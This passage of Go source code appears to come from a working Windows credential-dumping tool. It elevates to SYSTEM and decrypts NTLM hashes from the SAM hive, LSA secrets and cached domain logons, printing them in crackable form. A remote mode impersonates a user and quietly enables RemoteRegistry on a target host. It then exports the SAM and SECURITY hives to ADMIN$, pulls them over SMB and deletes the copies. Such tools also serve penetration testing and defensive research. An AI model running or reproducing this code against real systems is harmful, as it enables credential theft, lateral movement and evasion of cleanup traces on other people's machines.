	if err != nil {
		return nil, err
	}
	for _, key := range subkeys {
		if key == "NL$KM" {
			continue
		}
		plainText := DumpSecret(fmt.Sprintf("SECURITY\\Policy\\Secrets\\%s\\CurrVal", key), lsaKey)
		if plainText == nil {
			continue
		}
		VerbosePrint(fmt.Sprintf("[+] Extracting LSA SECRET -> %s", key))
		secretLen := binary.LittleEndian.Uint16(plainText[:4])
		if secretLen < 16 {
			secretBlob := &LSASecretBlob{
				Length: secretLen,
				Unk:    nil,
				Secret: plainText,
			}
			plainTxt, err := ExtractLsaSecret(key, secretBlob)
			if err != nil {
				VerbosePrint(fmt.Sprintf("[-] Failed to extract %s secret ERR %s", key, err.Error()))
				continue
			}
			secretsMap.LsaSecrets[key] = append(secretsMap.LsaSecrets[key], plainTxt)
		} else {
			secretBlob := &LSASecretBlob{
				Length: secretLen,
				Unk:    plainText[4:16],
				Secret: plainText[16 : secretLen+16],
			}
			plainTxt, err := ExtractLsaSecret(key, secretBlob)
			if err != nil {
				VerbosePrint(fmt.Sprintf("[-] Failed to extract %s secret ERR %s", key, err.Error()))
				continue
			}
			secretsMap.LsaSecrets[key] = append(secretsMap.LsaSecrets[key], plainTxt)
		}
	}
	return secretsMap, nil
}

func ComputeSha256(key, value []byte) []byte {
	buffer := make([]byte, 0)
	buffer = append(buffer, key...)
	counter := 0
	for i := 0; i < 1000; i++ {
		buffer = append(buffer, value[counter:counter+32]...)
	}
	hash := sha256.Sum256(buffer)
	return hash[:]
}

func GetLsa() (*LsaSecrets, error) {
	bootKey, err := GetBootKey()
	if err != nil {
		return nil, err
	}
	VerbosePrint("[+] Got BOOTKEY")
	lsaKey, err := GetLSAKey(bootKey)
	if err != nil {
		return nil, err
	}
	VerbosePrint("[+] Got Lsa Key")
	return GetLSASecrets(lsaKey)
}

func GetSam() (*SamSecrets, error) {
	s := &SamSecrets{
		SamSecrets: make([]SamSecret, 0),
	}
	sysKey, err := GetSysKey()
	if err != nil {
		return nil, err
	}
	rids, err := GetRids()
	if err != nil {
		return nil, err
	}
	VerbosePrint("[+] Got RIDS")
	for _, rid := range rids {
		if rid != "Names" {
			e, err := DumpHash(rid, sysKey)
			if err != nil {
				continue
			}
			s.SamSecrets = append(s.SamSecrets, *e)
		}
	}
	return s, nil
}

func DumpLsaSecrets() (string, error) {
	lsaSecrets, err := GetLsa()
	if err != nil {
		return "", err
	}
	return lsaSecrets.ClassicPrint(), nil
}

func DumpHashes() (string, error) {
	samSecrets, err := GetSam()
	if err != nil {
		return "", err
	}
	return samSecrets.ClassicPrint(), nil
}

var (
	systemFlag bool
	allFlag    bool
	samFlag    bool
	lsaFlag    bool
)

func StopService(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	if remoteRegistryWasDiabled {
		conf, err := service.Config()
		if err != nil {
			return err
		}
		conf.StartType = mgr.StartDisabled
		err = service.UpdateConfig(conf)
		if err != nil {
			return err
		}
		VerbosePrint("[+] Reverted Remote Registry To Disabled State.")
	}
	service.Control(svc.Stop)
	return nil
}
func StartService(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return err
	}
	conf, err := service.Config()
	if err != nil {
		return err
	}
	defer service.Close()
	if conf.StartType == mgr.StartDisabled {
		VerbosePrint("[+] Start Type is Disabled.")
		conf.StartType = uint32(mgr.StartManual)
		err = service.UpdateConfig(conf)
		if err != nil {
			return err
		}
		remoteRegistryWasDiabled = true
	}
	service.Start()
	return nil
}

func VerbosePrint(message string) {
	if verbose {
		fmt.Println(message)
	}
}

func IsRemoteRegistryEnabled(targetMachine, serviceName string) (bool, error) {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return false, err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return false, err
	}
	defer service.Close()
	status, err := service.Query()
	if err != nil {
		return false, err
	}
	if status.State != svc.Running {
		return false, nil
	}
	return true, nil
}

func StartRemoteRegistry(host string) error {
	return StartService(host, "RemoteRegistry")
}

func StopRemoteRegistry(host string) error {
	return StopService(host, "RemoteRegistry")
}

func LogonUserToAccessSVM(domain, user, pass string) error {
	var hToken syscall.Handle
	ok, err := win32.LogonUser(user, domain, pass, 9, 3, &hToken)
	if !ok {
		VerbosePrint("[-] Logon User Failed")
		return err
	}
	worked, err := win32.ImpersonateLoggedOnUser(windows.Token(hToken))
	if !worked {
		VerbosePrint("[-] ImpersonateLoggedOnUser Failed")
		return err
	}
	return nil
}

var user string
var pass string
var domain string
var host string
var command string
var verbose bool
var remote bool
var remoteRegistryWasDiabled bool = false

func ReadFileOnShare(machine, user, pass, domain, shareName, fileToRead string) ([]byte, error) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:445", machine))
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	var d *smb2.Dialer
	d = &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			Domain:   domain,
			User:     user,
			Password: pass,
		},
	}
	s, err := d.Dial(conn)
	if err != nil {
		return nil, err
	}
	defer s.Logoff()
	share, err := s.Mount(fmt.Sprintf("\\\\%s\\%s", machine, shareName))
	if err != nil {
		return nil, err
	}
	defer share.Umount()
	f, err := share.Open(fileToRead)
	if os.IsNotExist(err) {
		return nil, errors.New("File doesnt exist.")
	}
	f.Close()
	data, err := share.ReadFile(fileToRead)
	if err != nil {
		return nil, err
	}
	VerbosePrint(fmt.Sprintf("[+] Read File %s", fileToRead))
	err = share.Remove(fileToRead)
	if err != nil {
		return data, nil
	}
	VerbosePrint(fmt.Sprintf("[+] Deleted File %s", fileToRead))
	return data, nil
}

func ExportKeys(host string) error {
	rk, err := registry.OpenRemoteKey(host, registry.LOCAL_MACHINE)
	if err != nil {
		return err
	}
	defer rk.Close()
	samKey, err := registry.OpenKey(rk, "SAM", windows.MAXIMUM_ALLOWED)
	if err != nil {
		return err
	}
	defer samKey.Close()
	VerbosePrint("[+] Connected To Remote Registry")
	err = win32.RegSaveKeyExW(windows.Handle(samKey), "C:\\Windows\\sam.hive", 0, 1)
	if err != nil {
		return err
	}
	VerbosePrint("[+] Exported SAM")
	securityKey, err := registry.OpenKey(rk, "SECURITY", windows.MAXIMUM_ALLOWED)
	if err != nil {
		return err
	}
	defer securityKey.Close()
	err = win32.RegSaveKeyExW(windows.Handle(securityKey), "C:\\Windows\\security.hive", 0, 1)
	if err != nil {
		return err
	}
	VerbosePrint("[+] Exported SECURITY")
	return nil
}

func ParseSAMHive(rawHive []byte, bootKey []byte) (*ParsedSam, error) {
	parsedSam := &ParsedSam{}
	reader := bytes.NewReader(rawHive)
	var rawF []byte = nil
	var rawV []byte = nil
	rids := make([]string, 0)
	reg, err := regparser.NewRegistry(reader)
	if err != nil {
		return nil, err
	}
	// GET AES ENCRYPTED SYSKEY
	key := reg.OpenKey("SAM\\Domains\\Account")
	if key == nil {
		return nil, errors.New("Reg path not found.")
	}
	for _, value := range key.Values() {
		if value.ValueName() == "F" {
			rawF = value.ValueData().Data
		}
	}
	if rawF == nil {
		return nil, errors.New("Failed to get AES Encrypted SYSKEY")
	}
	if rawF[0] != 3 {
		return nil, errors.New("RC4 Encrypted SysKey Detected. Not Supported.")
	}
	VerbosePrint("[+] Got AES Encrypted SYSKEY From SAM FILE")
	encryptedSysKey := rawF[0x88 : 0x88+16]
	encryptedSysKeyIv := rawF[0x78 : 0x78+16]
	sysKey, err := DecryptSysKey(bootKey, encryptedSysKey, encryptedSysKeyIv)
	if err != nil {
		return nil, err
	}
	parsedSam.DecryptedSysKey = sysKey
	VerbosePrint("[+] Decrypted AES SYSKEY With BOOTKEY")
	ridsKey := reg.OpenKey("SAM\\Domains\\Account\\Users")
	if ridsKey == nil {
		return nil, errors.New("Rids Reg Path Not Found.")
	}
	for _, sub := range ridsKey.Subkeys() {
		if sub.Name() != "Names" {
			rids = append(rids, sub.Name())
		}
	}
	for _, rid := range rids {
		secretKey := reg.OpenKey(fmt.Sprintf("SAM\\Domains\\Account\\Users\\%s", rid))
		if secretKey == nil {
			VerbosePrint(fmt.Sprintf("[+] Failed to get encrypted NT hash for Rid %s", rid))
			continue
		}
		for _, value := range secretKey.Values() {
			if value.ValueName() == "V" {
				rawV = value.ValueData().Data
				o := binary.LittleEndian.Uint32(rawV[12:16]) + 204
				l := binary.LittleEndian.Uint32(rawV[16:20])
				userName := rawV[o : o+l]
				hashLength := rawV[0xAC]
				if hashLength == 0x14 {
					VerbosePrint("[!] Rc4 Encrypted Hash Detected. Not Supported.")
					continue
				}
				if hashLength != 0x38 {
					VerbosePrint(fmt.Sprintf("[-] %s RID has no NTLM Hash", rid))
					continue
				}
				hashOffset := binary.LittleEndian.Uint16(rawV[0xa8 : 0xa8+4]) //+ 0xCC
				ntOffSetInt := hashOffset + uint16(0xCC)
				ntRevision := rawV[ntOffSetInt+2 : ntOffSetInt+3][0]
				if ntRevision != 2 {
					VerbosePrint("[!] Not AES Hash. Not Supported.")
					continue
				}
				exists := rawV[0x9C+16 : 0x9C+20][0]
				if exists != 56 {
					VerbosePrint("[!] No Hash Found.")
					continue
				}
				iv := rawV[ntOffSetInt+8 : ntOffSetInt+24]
				hash := rawV[ntOffSetInt+24 : ntOffSetInt+24+56][:16]
				parsedSam.ridsAndSecrets = append(parsedSam.ridsAndSecrets, RidAndSecrets{
					Rid:      rid,
					Hash:     hash,
					Iv:       iv,
					UserName: userName,
				})
			}
		}
	}
	return parsedSam, nil
}

type RidAndSecrets struct {
	Rid      string
	Hash     []byte
	Iv       []byte
	UserName []byte
}

type ParsedSam struct {
	DecryptedSysKey []byte
	ridsAndSecrets  []RidAndSecrets
}

func GetSamRemote(parsedSamData *ParsedSam) *SamSecrets {
	s := &SamSecrets{
		SamSecrets: make([]SamSecret, 0),
	}
	for _, rid := range parsedSamData.ridsAndSecrets {
		if rid.Rid != "Names" {
			e, err := DumpHashRemote(rid, parsedSamData.DecryptedSysKey)
			if err != nil {
				continue
			}
			s.SamSecrets = append(s.SamSecrets, *e)
		}
	}
	return s
}

func DumpSecretFromBytes(registryKey string, lsaKey []byte, securityHiveBytes []byte) []byte {
	reader := bytes.NewReader(securityHiveBytes)
	reg, err := regparser.NewRegistry(reader)
	if err != nil {
		return nil
	}
	key := reg.OpenKey(registryKey)
	if key == nil {
		return nil
	}
	var data []byte
	for _, value := range key.Values() {
		if value.ValueName() == "" {
			data = value.ValueData().Data
			break
		}
	}
	secret := &LSASecret{
		Version:  data[:4],
		EncKeyID: data[4:20],
		EncAlgo:  data[20:24],
		Flags:    data[24:28],
		Data:     data[28:],
	}
	tmpKey := ComputeSha256(lsaKey, secret.Data[:32])
	val2 := secret.Data[32:]
	plainText := DecryptAESECB(val2, tmpKey)
	return plainText
}

func GetNLKMSecretRemote(lsaKey []byte, securityHiveBytes []byte) (string, []byte) {
	key := "Policy\\Secrets\\NL$KM\\CurrVal"
	plainText := DumpSecretFromBytes(key, lsaKey, securityHiveBytes)
	if plainText == nil {
		return "", nil
	}
	secretLen := binary.LittleEndian.Uint16(plainText[:4])
	secretBlob := &LSASecretBlob{
		Length: secretLen,
		Unk:    plainText[4:16],
		Secret: plainText[16 : secretLen+16],
	}
	secret, err := ExtractLsaSecretRemote("NL$KM", secretBlob, host, domain)
	if err != nil {
		return "", nil
	}
	return secret, plainText
}

func GetCachedDomainCredentialsRemote(nlkmKey []byte, rawSecurityHive []byte) (*CachedDomainCredentials, error) {
	Credentials := &CachedDomainCredentials{
		Credentials: make([]*CachedCredentials, 0),
	}
	reader := bytes.NewReader(rawSecurityHive)
	reg, err := regparser.NewRegistry(reader)
	if err != nil {
		return nil, err
	}
	key := reg.OpenKey("Cache")
	if key == nil {
		return nil, err
	}
	for _, v := range key.Values() {
		if v.ValueName() == "NL$CONTROL" {
			continue
		}
		data := v.ValueData().Data
		if err != nil {
			continue
		}
		if len(data) < 96 {
			continue
		}
		cachedUser := NLRecord{
			UserLength:       int(binary.LittleEndian.Uint16(data[:2])),
			DomainNameLength: int(binary.LittleEndian.Uint16(data[2:4])),
			DnsDomainLength:  int(binary.LittleEndian.Uint16(data[60:62])),
			IV:               data[64:80],
			EncryptedData:    data[96:],
		}
		if cachedUser.UserLength == 0 {
			continue
		}
		block, err := aes.NewCipher(nlkmKey[16:32])
		if err != nil {
			continue
		}
		thing := cipher.NewCBCDecrypter(block, cachedUser.IV)
		leftOver := len(cachedUser.EncryptedData) % 16
		if leftOver != 0 {
			padding := make([]byte, 0)
			for i := 16 - leftOver; i > 0; i-- {
				padding = append(padding, 0x00)
			}
			concat := make([]byte, len(cachedUser.EncryptedData)+len(padding))
			concat = append(concat, cachedUser.EncryptedData...)
			concat = append(concat, padding...)
			cachedUser.EncryptedData = concat
		}
		plainText := make([]byte, len(cachedUser.EncryptedData))
		thing.CryptBlocks(plainText, cachedUser.EncryptedData)
		ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
		unameOffset := 72
		pad := 2 * ((cachedUser.UserLength / 2) % 2)
		domainOffset := unameOffset + cachedUser.UserLength + pad
		pad = 2 * ((cachedUser.DomainNameLength / 2) % 2)
		domainNameOffset := domainOffset + cachedUser.DomainNameLength + pad
		hashedPw := plainText[:0x10]
		userName, err := ud.String(string(plainText[unameOffset : unameOffset+cachedUser.UserLength]))
		domain, err := ud.String(string(plainText[domainOffset : domainOffset+cachedUser.DomainNameLength]))
		domain = strings.ReplaceAll(domain, `\0`, "")
		domainName, err := ud.String(string(plainText[domainNameOffset : domainNameOffset+cachedUser.DnsDomainLength]))
		if err != nil {
			return nil, err
		}
		cred := fmt.Sprintf("%s/%s:$DCC2$10240#%s#%s", domain, userName, userName, hex.EncodeToString(hashedPw))
		c := &CachedCredentials{
			UserName:   userName,
			Domain:     domain + domainName,
			Credential: cred,
		}
		Credentials.Credentials = append(Credentials.Credentials, c)
	}
	return Credentials, nil
}

func GetLSASecretsRemote(lsaKey []byte, rawSecurityHive []byte) (*LsaSecrets, error) {
	secretsMap := &LsaSecrets{}
	secretsMap.LsaSecrets = make(map[string][]string, 0)
	NLKMSecretString, NLKMSecretBlob := GetNLKMSecretRemote(lsaKey, rawSecurityHive)
	if NLKMSecretString != "" {
		secretsMap.LsaSecrets["NL$KM"] = append(secretsMap.LsaSecrets["NL$KM"], NLKMSecretString)
		cached, err := GetCachedDomainCredentialsRemote(NLKMSecretBlob, rawSecurityHive)
		if err != nil {
			secretsMap.LsaSecrets["CachedDomainLogons"] = append(secretsMap.LsaSecrets["CachedDomainLogons"], "NULL")
		}
		for _, c := range cached.Credentials {
			secretsMap.LsaSecrets["CachedDomainLogons"] = append(secretsMap.LsaSecrets["CachedDomainLogons"], c.Credential)
		}
	}
	reader := bytes.NewReader(rawSecurityHive)
	reg, err := regparser.NewRegistry(reader)
	if err != nil {
		return nil, err
	}
	key := reg.OpenKey("Policy\\Secrets")
	if key == nil {
		return nil, err
	}
	for _, key := range key.Subkeys() {
		if key.Name() == "NL$KM" {
			continue
		}
		plainText := DumpSecretFromBytes(fmt.Sprintf("Policy\\Secrets\\%s\\CurrVal", key.Name()), lsaKey, rawSecurityHive)
		if plainText == nil {
			continue
		}
		VerbosePrint(fmt.Sprintf("[+] Extracting LSA SECRET -> %s", key.Name()))
		secretLen := binary.LittleEndian.Uint16(plainText[:4])
		if secretLen < 16 {
			secretBlob := &LSASecretBlob{
				Length: secretLen,
				Unk:    nil,
				Secret: plainText,
			}
			plainTxt, err := ExtractLsaSecretRemote(key.Name(), secretBlob, host, domain)
			if err != nil {
				VerbosePrint(fmt.Sprintf("[+] Failed to extract %s secret ERR %s", key.Name(), err.Error()))
				continue
			}
			secretsMap.LsaSecrets[key.Name()] = append(secretsMap.LsaSecrets[key.Name()], plainTxt)
		} else {
			secretBlob := &LSASecretBlob{
				Length: secretLen,
				Unk:    plainText[4:16],
				Secret: plainText[16 : secretLen+16],
			}
			plainTxt, err := ExtractLsaSecretRemote(key.Name(), secretBlob, host, domain)
			if err != nil {
				VerbosePrint(fmt.Sprintf("[+] Failed to extract %s secret ERR %s", key.Name(), err.Error()))
				continue
			}
			secretsMap.LsaSecrets[key.Name()] = append(secretsMap.LsaSecrets[key.Name()], plainTxt)
		}
	}
	return secretsMap, nil
}

func GetLsaRemote(bootKey []byte, securityHiveBytes []byte) (*LsaSecrets, error) {
	lsaKey, err := GetLSAKeyRemote(bootKey, securityHiveBytes)
	VerbosePrint("[+] Got LSA KEY")
	if err != nil {
		return nil, err
	}
	return GetLSASecretsRemote(lsaKey, securityHiveBytes)
}

func RemoteMain() {
	var stopRemoteReg bool = true
	VerbosePrint("[+] Remote Mode")
	if user == "" || pass == "" {
		fmt.Printf("Missing User or Pass arguments.\n")
		flag.PrintDefaults()
		return
	}
	err := LogonUserToAccessSVM(domain, user, pass)
	if err != nil {
		fmt.Println(err)
		return
	}
	VerbosePrint("[+] Checking If Remote Registry Is Enabled")
	running, err := IsRemoteRegistryEnabled(host, "RemoteRegistry")
	if err != nil {
		VerbosePrint("[+] Probably Invalid Credentials")
		fmt.Println(err)
		return
	}
	VerbosePrint("[+] Logon User, ImpersonateLoggedOnUser Worked.")
	if running {
		VerbosePrint("[+] Remote Registry Already Running.")
		stopRemoteReg = false
	} else {
		err = StartRemoteRegistry(host)
		if err != nil {
			fmt.Println(err)
			return
		}
		VerbosePrint("[+] Started Remote Registry")
	}
	err = ExportKeys(host)
	if err != nil {
		fmt.Println(err)
		return
	}
	bootKey, err := GetBootKeyRemote(host)
	if err != nil {
		fmt.Println(err)
		return
	}
	VerbosePrint("[+] Got BOOT KEY")
	if stopRemoteReg {
		err = StopRemoteRegistry(host)
		if err != nil {
			fmt.Println(err)
		}
		VerbosePrint("[+] Stopped Remote Registry")
	} else {
		VerbosePrint("[+] Not Stopping Remote Registry.")
	}

	samBytes, err := ReadFileOnShare(host, user, pass, domain, "ADMIN$", "sam.hive")
	if err != nil {
		fmt.Println(err)
		return
	}
	securityBytes, err := ReadFileOnShare(host, user, pass, domain, "ADMIN$", "security.hive")
	if err != nil {
		fmt.Println(err)
		return
	}
	VerbosePrint(fmt.Sprintf("[+] Sam Hive Size %d", len(samBytes)))
	VerbosePrint(fmt.Sprintf("[+] Security Hive Size %d", len(securityBytes)))
	VerbosePrint("[+] Attempting to parse SAM HIVE")
	parsedSamData, err := ParseSAMHive(samBytes, bootKey)
	if err != nil {
		fmt.Println(err)
		return
	}
	samSecrets := GetSamRemote(parsedSamData)
	if len(samSecrets.SamSecrets) == 0 {
		fmt.Println("[-] No SAM SECRETS FOUND.")
		return
	}
	fmt.Println(samSecrets.ClassicPrint())
	VerbosePrint("[+] Attempting to Parse SECURITY HIVE")
	lsaSecrets, err := GetLsaRemote(bootKey, securityBytes)
	if err != nil {
		VerbosePrint("[-] Failed to get LSA Secrets.")
		fmt.Println(err)
		return
	}
	fmt.Println(lsaSecrets.ClassicPrint())
	windows.RevertToSelf()
	VerbosePrint("[+] Reverted To Self.")
	return
}

func main() {
	flag.BoolVar(&systemFlag, "noElevate", false, "Dont Elevate To System Before Dump.")
	flag.BoolVar(&remote, "remote", false, "Target Remote Machine.")
	flag.StringVar(&user, "u", "", "Username Only Available In Remote Mode")
	flag.StringVar(&pass, "p", "", "Password Only Available In Remote Mode")
	flag.StringVar(&domain, "d", ".", "Domain Only Available In Remote Mode")
	flag.StringVar(&host, "h", "localhost", "Host Only Available In Remote Mode")
	flag.BoolVar(&verbose, "v", false, "Verbose Flag")
	flag.Parse()
	if remote {
		if user == "" || pass == "" {
			fmt.Printf("Missing User or Pass arguments.\n")
			flag.PrintDefaults()
			return
		}
		runtime.LockOSThread()
		RemoteMain()
		runtime.UnlockOSThread()
		return
	}
	runtime.LockOSThread()
	if !systemFlag {
		if _, err := GetSystem(); err != nil {
			fmt.Println("[-] Failed to elevate to system privileges")
			return
		}
	}
	samSecrets, err := GetSam()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(samSecrets.ClassicPrint())
	lsaSecrets, err := GetLsa()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(lsaSecrets.ClassicPrint())
	runtime.UnlockOSThread()
}
